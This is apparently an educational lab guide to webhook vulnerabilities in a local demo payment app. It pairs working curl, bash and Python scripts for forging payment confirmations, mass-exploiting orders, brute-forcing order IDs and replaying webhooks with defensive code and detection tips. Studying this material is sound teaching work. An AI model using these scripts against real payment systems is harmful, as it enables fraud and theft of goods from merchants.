# 🔴 ATTACK SCENARIOS - Educational Guide

## Overview
This document provides step-by-step attack scenarios for demonstrating webhook vulnerabilities in an educational setting.

---

## Scenario 1: Basic Webhook Exploitation

### 🎯 Objective
Unlock premium content without payment by sending a fake webhook.

### Prerequisites
- Server running on localhost:3000
- Valid Order ID from creating an order
- curl or Postman installed

### Attack Steps

#### Step 1: Reconnaissance
```bash
# Visit the application
open http://localhost:3000

# Observe the behavior:
# - Product costs ₹999
# - "Buy Now" button creates order
# - Payment page shows Order ID
```

#### Step 2: Create Legitimate Order
```bash
# Through browser:
1. Click "Buy Now"
2. Alert shows Order ID (e.g., ORD_ABC123XYZ)
3. Copy this Order ID
4. Note: Payment page shows status = PENDING
```

#### Step 3: Identify Webhook Endpoint
```bash
# Check the page source or network requests
# The webhook endpoint is exposed: /webhook/payment

# Endpoint details:
URL: http://localhost:3000/webhook/payment
Method: POST
Content-Type: application/json
```

#### Step 4: Craft Malicious Request
```bash
# Minimal required payload:
{
  "order_id": "ORD_ABC123XYZ",
  "payment_success": true
}
```

#### Step 5: Execute Attack
```bash
curl -X POST http://localhost:3000/webhook/payment \
  -H "Content-Type: application/json" \
  -d '{
    "order_id": "ORD_ABC123XYZ",
    "payment_success": true
  }'
```

#### Step 6: Verify Success
```bash
# Expected response:
{
  "success": true,
  "message": "Payment confirmed (insecure)",
  "order": {
    "order_id": "ORD_ABC123XYZ",
    "status": "PAID",
    "paid_at": "2026-02-12T..."
  }
}

# In browser:
# 1. Click "Check Order Status"
# 2. Status changes: PENDING → PAID
# 3. Auto-redirect to success page
# 4. Premium content now accessible
```

### Impact Assessment
- **Financial Loss:** ₹999 per order
- **Scale:** Unlimited orders can be exploited
- **Detection:** Low (appears as legitimate transaction)
- **Complexity:** Very Low (anyone with curl can do it)

---

## Scenario 2: Automated Mass Exploitation

### 🎯 Objective
Automate the attack to compromise multiple orders rapidly.

### Attack Script (Bash)
```bash
#!/bin/bash

# Mass webhook exploit script
API_URL="http://localhost:3000"
WEBHOOK_URL="$API_URL/webhook/payment"

# Function to create and exploit order
exploit_order() {
    # Create order
    echo "Creating order..."
    ORDER_RESPONSE=$(curl -s -X POST "$API_URL/api/create-order" \
        -H "Content-Type: application/json" \
        -d '{}')
    
    # Extract order ID
    ORDER_ID=$(echo $ORDER_RESPONSE | grep -o '"order_id":"[^"]*"' | cut -d'"' -f4)
    echo "Order created: $ORDER_ID"
    
    # Exploit webhook
    echo "Sending fake payment..."
    WEBHOOK_RESPONSE=$(curl -s -X POST "$WEBHOOK_URL" \
        -H "Content-Type: application/json" \
        -d "{
            \"order_id\": \"$ORDER_ID\",
            \"payment_success\": true
        }")
    
    echo "Response: $WEBHOOK_RESPONSE"
    echo "---"
}

# Exploit 10 orders
for i in {1..10}; do
    echo "Attack iteration $i"
    exploit_order
    sleep 1
done

echo "Attack complete! Check admin panel for compromised orders."
```

### Python Alternative
```python
import requests
import time

API_URL = "http://localhost:3000"

def exploit_order():
    # Create order
    create_response = requests.post(f"{API_URL}/api/create-order")
    order_data = create_response.json()
    order_id = order_data['order_id']
    
    print(f"Created order: {order_id}")
    
    # Exploit webhook
    webhook_payload = {
        "order_id": order_id,
        "payment_success": True
    }
    
    webhook_response = requests.post(
        f"{API_URL}/webhook/payment",
        json=webhook_payload
    )
    
    print(f"Webhook response: {webhook_response.json()}")
    return order_id

# Exploit multiple orders
for i in range(10):
    print(f"\n--- Attack iteration {i+1} ---")
    exploit_order()
    time.sleep(1)

print("\n✅ Mass exploitation complete!")
```

### Impact
- **Speed:** 10 orders compromised in ~15 seconds
- **Automation:** Can be scaled to 1000s of orders
- **Cost to business:** ₹9,990 in this example (10 × ₹999)

---

## Scenario 3: Bypass Attempt Against Secure Mode

### 🎯 Objective
Attempt to exploit secure mode and understand why it fails.

### Step 1: Enable Secure Mode
```bash
curl -X POST http://localhost:3000/api/toggle-security
```

### Step 2: Attempt Basic Attack (Will Fail)
```bash
curl -X POST http://localhost:3000/webhook/payment \
  -H "Content-Type: application/json" \
  -d '{
    "order_id": "ORD_XYZ789",
    "payment_success": true
  }'

# Response:
{
  "error": "Invalid signature"
}
```

### Step 3: Attempt with Fake Signature (Will Fail)
```bash
curl -X POST http://localhost:3000/webhook/payment \
  -H "Content-Type: application/json" \
  -d '{
    "order_id": "ORD_XYZ789",
    "payment_success": true,
    "signature": "fake_signature_12345"
  }'

# Response:
{
  "error": "Invalid signature"
}
```

### Step 4: Generate Valid Signature (Will Succeed)
```bash
# First, run signature generator
node generate-signature.js

# Copy the generated signature
# Then use it in webhook:
curl -X POST http://localhost:3000/webhook/payment \
  -H "Content-Type: application/json" \
  -d '{
    "order_id": "ORD_XYZ789",
    "payment_success": true,
    "signature": "VALID_SIGNATURE_HERE"
  }'

# Response:
{
  "success": true,
  "message": "Payment confirmed (secure)"
}
```

### Lessons Learned
- Signature verification prevents unauthorized webhooks
- Attackers need the secret key to forge signatures
- Without the secret, attacks are blocked
- This is why secret management is critical

---

## Scenario 4: Order ID Enumeration

### 🎯 Objective
Discover valid order IDs by enumeration.

### Attack Method
```bash
# Order IDs follow pattern: ORD_XXXXXXXXX
# Where X is alphanumeric

# Brute force script (educational only)
for id in ORD_A{A..Z}{A..Z}{A..Z}{0..9}{0..9}{0..9}
do
    curl -s "http://localhost:3000/api/order/$id" | grep -q "error" || echo "Found: $id"
done
```

### Defense
```javascript
// Add rate limiting to order status endpoint
const rateLimit = require('express-rate-limit');

const orderStatusLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100 // limit each IP to 100 requests per window
});

app.get('/api/order/:orderId', orderStatusLimiter, (req, res) => {
  // ... existing code
});
```

---

## Scenario 5: Timing Attack Analysis

### 🎯 Objective
Detect vulnerable vs secure mode based on response times.

### Experiment
```python
import requests
import time

def timing_attack(order_id):
    start = time.time()
    
    response = requests.post(
        "http://localhost:3000/webhook/payment",
        json={
            "order_id": order_id,
            "payment_success": True,
            "signature": "invalid"
        }
    )
    
    elapsed = time.time() - start
    print(f"Response time: {elapsed:.4f}s - Status: {response.status_code}")

# Test multiple times
for i in range(10):
    timing_attack("ORD_TEST123")
```

### Observations
- **Insecure mode:** ~5-10ms (no verification)
- **Secure mode:** ~15-30ms (HMAC computation)
- **Difference:** Detectable, but doesn't help attacker bypass security

---

## Scenario 6: Race Condition Exploitation

### 🎯 Objective
Process the same order twice by exploiting race conditions.

### Attack Setup
```bash
# Send multiple webhooks simultaneously
for i in {1..5}; do
    curl -X POST http://localhost:3000/webhook/payment \
      -H "Content-Type: application/json" \
      -d '{
        "order_id": "ORD_SAME123",
        "payment_success": true
      }' &
done
wait
```

### Expected Result (Vulnerable)
- Order processed multiple times
- Duplicate payment confirmations
- Potential double-crediting

### Defense
```javascript
// Add idempotency check
const processedWebhooks = new Set();

app.post('/webhook/payment', (req, res) => {
  const { order_id } = req.body;
  const webhookKey = `${order_id}_${Date.now()}`;
  
  // Check if already processing
  if (processedWebhooks.has(order_id)) {
    return res.status(409).json({ error: 'Already processing' });
  }
  
  processedWebhooks.add(order_id);
  
  // ... process payment
  
  // Remove after processing
  setTimeout(() => processedWebhooks.delete(order_id), 60000);
});
```

---

## Scenario 7: Webhook Replay Attack

### 🎯 Objective
Capture and replay a legitimate webhook.

### Attack Flow
```bash
# Step 1: Intercept legitimate webhook (e.g., via network monitoring)
# Captured payload:
{
  "order_id": "ORD_REAL456",
  "payment_success": true,
  "signature": "abc123validhash",
  "timestamp": 1708012800
}

# Step 2: Replay the captured webhook
curl -X POST http://localhost:3000/webhook/payment \
  -H "Content-Type: application/json" \
  -d @captured_webhook.json
```

### Defense Strategy
```javascript
// Add timestamp validation
const MAX_WEBHOOK_AGE = 300; // 5 minutes

app.post('/webhook/payment', (req, res) => {
  const { timestamp } = req.body;
  const now = Math.floor(Date.now() / 1000);
  
  if (!timestamp || (now - timestamp) > MAX_WEBHOOK_AGE) {
    return res.status(400).json({ error: 'Webhook expired' });
  }
  
  // Continue processing...
});
```

---

## Detection & Forensics

### Log Analysis
```bash
# View webhook logs
curl http://localhost:3000/api/webhook-logs | jq

# Look for suspicious patterns:
# - Multiple webhooks for same order
# - Webhooks without valid timestamps
# - Rapid succession of webhooks
# - Orders paid within seconds of creation
```

### Indicators of Compromise
1. **Order-to-Payment Time < 5 seconds**
   - Normal: 30-300 seconds (user payment flow)
   - Exploited: 1-3 seconds (direct webhook call)

2. **Missing User Agent in Logs**
   - Legitimate: Payment gateway user agent
   - Exploited: curl/7.x or missing

3. **Unusual Source IPs**
   - Legitimate: Payment gateway IP ranges
   - Exploited: Random IPs, localhost, VPN exits

---

## Defensive Measures Summary

### ✅ Must-Have Protections
1. **HMAC Signature Verification**
2. **Webhook Secret Management**
3. **IP Whitelisting**
4. **Idempotency Checks**
5. **Timestamp Validation**

### ✅ Recommended Additions
6. Rate limiting
7. Order amount verification
8. Duplicate detection
9. Logging and monitoring
10. Payment gateway confirmation

### ✅ Advanced Security
11. Mutual TLS (mTLS)
12. Webhook rotation
13. Real-time anomaly detection
14. Fraud scoring
15. Manual review for high-value transactions

---

## Real-World Case Studies

### Case 1: E-commerce Platform (2019)
- **Vulnerability:** No webhook signature
- **Attack:** Automated bot created 10,000 fake orders
- **Loss:** $150,000 in digital goods
- **Fix:** Implemented HMAC + IP filtering

### Case 2: SaaS Subscription Service (2020)
- **Vulnerability:** Signature checked but not enforced
- **Attack:** Parameter tampering (signature=null)
- **Loss:** 500+ premium accounts activated
- **Fix:** Strict signature enforcement + logging

### Case 3: Ticketing Platform (2021)
- **Vulnerability:** Replay attacks allowed
- **Attack:** Captured webhook replayed 100+ times
- **Loss:** 2,000 duplicate tickets issued
- **Fix:** Added timestamp + nonce validation

---

## Ethical Considerations

### ⚠️ Legal Warning
- Testing on systems you don't own is **ILLEGAL**
- Always get written permission
- This demo is for educational purposes ONLY
- Unauthorized access is a criminal offense

### 🎓 Educational Use Only
- Use only on this demo application
- Do not attempt on production systems
- Share knowledge responsibly
- Report real vulnerabilities through proper channels

---

## Further Learning

### Recommended Resources
1. OWASP Webhook Security Cheat Sheet
2. PCI DSS Requirements for Payment Webhooks
3. NIST Guidelines on API Security
4. Bug Bounty Programs (HackerOne, Bugcrowd)

### Practice Environments
- DVWA (Damn Vulnerable Web Application)
- WebGoat (OWASP)
- HackTheBox
- TryHackMe

---

**Remember: With great power comes great responsibility. Use this knowledge to build more secure systems, not to break existing ones.**
